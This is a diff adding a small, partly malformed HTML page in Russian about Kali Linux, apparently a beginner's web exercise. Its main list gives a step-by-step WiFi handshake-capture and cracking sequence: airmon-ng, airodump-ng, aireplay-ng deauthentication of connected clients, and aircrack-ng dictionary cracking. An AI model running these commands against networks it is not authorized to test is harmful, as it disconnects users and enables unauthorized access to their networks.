@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>kali@root</title>
+    <meta charset="utf-8">
+    <meta name="keywords" content="kali">
+    <meta name="keywords" content="kali site">
+    <meta itemprop=description content="About Kali Linux">
+    <link rel="shortcut icon" href="linux-logo.png" type="icon/png">
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+   <h1>KALI LINUX!!</h1>
+   <noindex>
+     <a href="https://www.kali.org/" target="_blank" rel="nofollow"><b>Kali Linux</b></a> <p>(ранее известный как Отслeдить Linux) <em>это <button id="button">Linux</button> с открытым</p>
+   <p>исходным кодом, основанный на Debian распространение,</p>
+   <p>направленное на расширенное тестирование на проникновение</p>
+   <p>и аудит безопасности. Кали Linux содержит несколько сотен</p>
+   <p>инструментов предназначен для решения различных задач в области</p>
+   <p>информационной безопасности, таких как Тестирование на проникновение.</em></p><br>
+   <p><b>Туториалы по тестирование на проникновение</b></p>
+   <a href="https://www.kalitutorials.net/"target="_blank">ТУТ</a><p>
+   <b>Тестирование на проникновение WIFI</b></p>
+   <script src="script.js"></script>
+   <ul>
+     <li><b>sudo su</b> - <ins>получаем root</ins></li>
+     <li><b>ifconfig</b> - <ins>адаптеры(eth0,wlan0,wlan1</ins></li>
+     <li><b>airmon-ng check kill</b> - <ins>отключает не нужные процессы</ins></li>
+     <li><b>airmon-ng start wlan0</b> - <ins>интерферс(wlan0mon)</ins></li>
+     <li><b>airodump-ng wlan0mon</b> - <ins>сканирование сетей</ins></li>
+     <li><b>airodump-ng --bssid a(MAC адрес точки доступа – без скобок!]</b> --channel 1 -w wifi wlan0mon - <ins>сканирование определённой точки доступа и перехват "хендшейка"</ins></li>
+     <li><b>aireplay-ng --deauth 20 -a [MAC точки доступа] -c [MAC подключенного клиента] wlan0mon</b> - <ins>деинтефикация устройств(а)</ins></li>
+     <li><b>wpaclean ИмяНовогоФайла ИмяСтарогоФайла</b> - <ins>очистка от лишних данных</ins></li>
+     <li><b>aircrack-ng -w [ПутьКСловарю] -b [MAC точки доступа] [ЧистыйХэндшейк .cap]</b> - <ins>финальная команда</ins></li>
+   </ul>
+   <div class="paragraph">
+     <video class="video-gif" loop pip="false"
+     playsinline>...</video>
+     <source src="dio.mp4" type="video/mp4"
+   </video>
+   </div>
+   <section class="theory-viewer__block theory-viewer__block_type_markdown"><div class="base-markdown base-markdown_with-gallery markdow markdown_type_theory"><img alt="image" class="image image_expandable" src="kalic.jpg" size = 5>
+
+ </body>
+</html>
